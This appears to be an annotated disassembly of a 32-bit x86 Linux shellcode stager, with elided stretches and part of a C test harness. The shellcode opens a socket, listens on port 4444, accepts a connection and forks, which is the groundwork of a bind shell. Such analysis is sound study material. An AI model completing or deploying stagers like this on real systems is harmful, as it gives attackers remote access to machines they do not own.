...
$ r2 -a x86 -b 32 -c 'pd' stage1.bin
            ...
            0x00000023      51             push ecx            ; old_esp = esp              00000000|00000001|00000002|ffff0008<
            0x00000024      6a04           push 4              ; optlen = 4                 00000000|00000001|00000002|ffff0008|00000004<
            0x00000026      54             push esp            ; optval = esp; val = 4      00000000|00000001|00000002|ffff0008|00000004|ffff0014<
            0x00000027      6a02           push 2              ; optname = IP_HDRINCL(2)    00000000|00000001|00000002|ffff0008|00000004|ffff0014|00000002<
            0x00000029      6a01           push 1              ; level = IPPROTO_ICMP(1)    00000000|00000001|00000002|ffff0008|00000004|ffff0014|00000002|00000001<
            0x0000002b      50             push eax            ; sockfd = eax               00000000|00000001|00000002|ffff0008|00000004|ffff0014|00000002|00000001|12341234<
            0x0000002c      97             xchg eax, edi       ; edi = 0x12341234, eax = ????????
            0x0000002d      89e1           mov ecx, esp        ; args = *esp
            0x0000002f      6a0e           push 0xe            ; 14                         00000000|00000001|00000002|ffff0008|00000004|ffff0014|00000002|00000001|12341234|0000000e<
            0x00000031      5b             pop ebx             ; call = SYS_SETSOCKOPT(14)  00000000|00000001|00000002|ffff0008|00000004|ffff0014|00000002|00000001|12341234<
            0x00000032      6a66           push 0x66           ; 'f' ; 102                  00000000|00000001|00000002|ffff0008|00000004|ffff0014|00000002|00000001|12341234|00000066<
            ...
            0x00000035      cd80           int 0x80        !!! ; socketcall(SYS_SETSOCKOPT, *esp) || setsockopt(sockfd, IPPROTO_ICMP, IP_HDRINCL, &val, 4)

            0x00000037      97             xchg eax, edi       ; eax = 0x12341234, edi = 0x00000000
            0x00000038      83c414         add esp, 0x14                                    00000000|00000001|00000002|ffff0008<
            ...
            0x00000046      51             push ecx            ; sockaddr_in = old_esp      00000000|00000000|5c110002|00000010|ffff0008<
            0x00000047      50             push eax            ; sockfd                     00000000|00000000|5c110002|00000010|ffff0008|12341234<
            ...
            0x0000004f      d1e3           shl ebx, 1          ; call = SYS_LISTEN(4)
            0x00000051      b066           mov al, 0x66        ; syscall #102: int socketcall(int call, unsigned long *args) || int listen(int sockfd, int backlog);
            0x00000053      cd80           int 0x80        !!! ; listen(sockfd, 0xffff0008)

            0x00000055      50             push eax            ;                            00000000|00000000|5c110002|00000010|ffff0008|12341234|00000000<
            ...
            0x00000059      895104         mov dword [ecx + 4], edx                         00000000|00000000|5c110002|00000010|00000000|12341234|00000000<
            0x0000005c      cd80           int 0x80        !!! ; accept(sockfd, NULL, 0x10)

            0x0000005e      93             xchg eax, ebx       ; eax = 5, ebx = 0x43214321 (sockfd of the accepted socket)
            0x0000005f      b60c           mov dh, 0xc         ; edx = 12
            0x00000061      b003           mov al, 3           ; syscall #3: pid_t fork(void);
            0x00000063      cd80           int 0x80        !!! ; fork()

            0x00000065      87df           xchg edi, ebx       ; edi = 0x43214321, ebx = 0x00000000
            0x00000067      5b             pop ebx             ; ebx = 0x00000000           00000000|00000000|5c110002|00000010|00000000|12341234<
            0x00000068      b006           mov al, 6           ; syscall #6: int close(int fd);
            0x0000006a      cd80           int 0x80        !!! ; close(0x12341234)
...
int main(int argc, char* argv[]) {
        ...
        result = setsockopt(sockfd, IPPROTO_ICMP, IP_HDRINCL, &val, 4);
        printf("setsockopt():\t0x%08x\n", result);
        if (result == -1) {
                perror("setsockopt");
        }
